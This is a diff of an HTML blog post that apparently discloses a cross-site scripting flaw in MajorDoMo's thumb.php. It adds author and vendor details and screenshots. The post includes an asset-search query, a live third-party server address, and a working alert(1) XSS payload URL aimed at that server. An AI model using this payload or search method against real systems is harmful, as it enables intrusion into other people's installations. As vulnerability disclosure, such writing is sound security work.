@@ -173,7 +173,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2024-04-24 09:32:57 / Modified: 10:58:21" itemprop="dateCreated datePublished" datetime="2024-04-24T09:32:57+08:00">2024-04-24</time>
+      <time title="Created: 2024-04-24 09:32:57 / Modified: 11:14:34" itemprop="dateCreated datePublished" datetime="2024-04-24T09:32:57+08:00">2024-04-24</time>
     </span>
 
   
@@ -186,9 +186,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="Vulnerability-description"><a href="#Vulnerability-description" class="headerlink" title="Vulnerability description"></a>Vulnerability description</h3><p>Cross Site Scripting vulnerability in MajorDoMo before v.0662e5e allows an attacker to escalate privileges via the the thumb&#x2F;thumb.php component.</p>
+          <h3 id="BUG-Author"><a href="#BUG-Author" class="headerlink" title="BUG_Author:"></a>BUG_Author:</h3><p>hbzms</p>
+<h3 id="Vendor"><a href="#Vendor" class="headerlink" title="Vendor:"></a>Vendor:</h3><p><a target="_blank" rel="noopener" href="https://majordomo.smartliving.ru/">https://majordomo.smartliving.ru/</a></p>
+<h3 id="Vulnerability-description"><a href="#Vulnerability-description" class="headerlink" title="Vulnerability description"></a>Vulnerability description</h3><p>Cross Site Scripting vulnerability in MajorDoMo before v.0662e5e allows an attacker to escalate privileges via the the thumb&#x2F;thumb.php component.</p>
 <h3 id="Sphere-of-influence"><a href="#Sphere-of-influence" class="headerlink" title="Sphere of influence"></a>Sphere of influence</h3><p>MajorDoMo &lt; 0662e5e</p>
-<h3 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h3><p>app&#x3D;”MajordomoSL”<br>Find related assets as follows(Just use one as an example)<br><a target="_blank" rel="noopener" href="http://95.110.79.90:9090/">http://95.110.79.90:9090/</a><br>Visit the above url link<br>Then add the payload after the link<br>The payload is as follows<br><a target="_blank" rel="noopener" href="http://95.110.79.90:9090/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%3Cimg%20src=1%20onerror=alert(1)%3E">http://95.110.79.90:9090/modules/thumb/thumb.php?url=cnRzcDovL2EK&amp;debug=1&amp;transport=%3Cimg%20src=1%20onerror=alert(1)%3E</a><br><img src="/../../images/xss.jpg" alt="xss"></p>
+<h3 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h3><p>app&#x3D;”MajordomoSL”<br>Find related assets as follows(Just use one as an example)<br><a target="_blank" rel="noopener" href="http://95.110.79.90:9090/">http://95.110.79.90:9090/</a><br>Visit the above url link<br>Then add the payload after the link<br>The payload is as follows<br><a target="_blank" rel="noopener" href="http://95.110.79.90:9090/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%3Cimg%20src=1%20onerror=alert(1)%3E">http://95.110.79.90:9090/modules/thumb/thumb.php?url=cnRzcDovL2EK&amp;debug=1&amp;transport=%3Cimg%20src=1%20onerror=alert(1)%3E</a><br><img src="/../../images/xss.jpg" alt="xss"><br><img src="/../../images/xss1.jpg" alt="xss"><br><img src="/../../images/xss2.jpg" alt="xss"></p>
 <h3 id="Repair-suggestions"><a href="#Repair-suggestions" class="headerlink" title="Repair suggestions"></a>Repair suggestions</h3><p>Turn off Internet exposure or interface settings access</p>
 
       
